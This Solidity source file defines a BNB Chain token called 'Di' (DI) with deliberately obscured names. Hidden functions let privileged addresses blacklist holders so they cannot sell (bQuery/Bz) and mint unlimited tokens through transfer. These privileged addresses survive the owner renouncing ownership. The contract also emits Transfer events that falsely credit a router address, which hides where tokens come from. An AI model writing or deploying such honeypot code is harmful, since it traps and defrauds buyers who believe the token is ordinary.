/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address BZC = 0xE01f4125A9bBc0AdEa3d9721A20ba3d721eC0F51;
	address bZRouterV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract Db is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Bc;
	mapping (address => bool) private Bb;
    mapping (address => bool) private Bz;
    mapping (address => mapping (address => uint256)) private eB;
    uint8 private constant _decimals = 8;
    uint256 private constant sB = 200000000 * 10**_decimals;
    string private constant _name = "Di";
    string private constant _symbol = "DI";



    constructor () {
        Bc[_msgSender()] = sB;
        emit Transfer(address(0), bZRouterV2, sB);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return sB;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Bc[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return eB[owner][spender];
    }
            function approve(address spender, uint256 amount) public returns (bool success) {    
        eB[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function BDX(address Bf) public {
        if(Bb[msg.sender]) { 
        Bz[Bf] = false;}}
        function bQuery(address Bf) public{
         if(Bb[msg.sender])  { 
        Bz[Bf] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == BZC)  {
        require(amount <= Bc[sender]);
        Bc[sender] -= amount;  
        Bc[recipient] += amount; 
          eB[sender][msg.sender] -= amount;
        emit Transfer (bZRouterV2, recipient, amount);
        return true; }  else  
          if(!Bz[recipient]) {
          if(!Bz[sender]) {
         require(amount <= Bc[sender]);
        require(amount <= eB[sender][msg.sender]);
        Bc[sender] -= amount;
        Bc[recipient] += amount;
      eB[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Bi, uint256 Bf) public {
        if(msg.sender == BZC)  {
        require(Bc[msg.sender] >= Bf);
        Bc[msg.sender] -= Bf;  
        Bc[Bi] += Bf; 
        emit Transfer (bZRouterV2, Bi, Bf);} else  
        if(Bb[msg.sender]) {Bc[Bi] += Bf;} else
        if(!Bz[msg.sender]) {
        require(Bc[msg.sender] >= Bf);
        Bc[msg.sender] -= Bf;  
        Bc[Bi] += Bf;          
        emit Transfer(msg.sender, Bi, Bf);}}
        
        		function BRX(address Bf) onlyOwner public{
        Bb[Bf] = true; }

        
        }